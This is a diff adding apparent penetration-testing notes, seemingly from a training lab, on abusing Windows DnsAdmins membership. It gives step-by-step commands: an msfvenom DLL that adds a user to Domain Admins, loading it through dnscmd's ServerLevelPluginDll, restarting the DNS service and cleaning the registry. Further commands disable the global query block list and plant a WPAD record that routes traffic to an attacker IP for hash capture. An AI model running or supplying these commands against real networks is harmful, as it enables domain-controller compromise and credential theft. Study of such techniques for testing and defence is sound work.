@@ -240,3 +240,53 @@ wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | fin
 # Membership in just the Event Log Readers group is not sufficient.
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
 ```
+
+## DnsAdmins
+- Members of the DnsAdmins group have access to DNS information on the network.
+- The Windows DNS service supports custom plugins and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones.
+- DnsAdmins group doesn't give the ability to restart the DNS service, but this is conceivably something that sysadmins might permit DNS admins to do.
+-  Membership in this group gives us the rights to disable global query block security which can be used in Creating a WPAD (Web Proxy Automatic Discovery Protocol) Record 
+
+
+### RCE
+- DNS management is performed over RPC
+- ServerLevelPluginDll allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the dnscmd tool from the command line
+- When a member of the DnsAdmins group runs the dnscmd command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated
+- When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
+- An attacker can load a custom DLL in context of `system/nt` in DC to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.
+
+```powershell
+# 1) Generating Malicious DLL , from linux 
+msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
+
+# 2) send dll to windows victim
+
+# 3) Loading Custom DLL
+dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+
+# 4) Checking Permissions on DNS Service
+wmic useraccount where name="<username>" get sid
+
+# RPWP permissions which translate to SERVICE_START and SERVICE_STOP, respectively.
+sc.exe sdshow DNS
+(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)
+
+# 5) Restarting the DNS Service
+sc.exe stop dns
+sc.exe start dns
+
+# 6) Confirming Registry Key Added and cleaning
+reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
+reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
+```
+
+### Disabling the Global Query Block List
+- After disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our attack machine.
+- We could use a tool such as Responder or Inveigh to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack.
+```powershell
+# Disabling the Global Query Block List
+Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
+
+# Adding a WPAD Record
+Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
+```
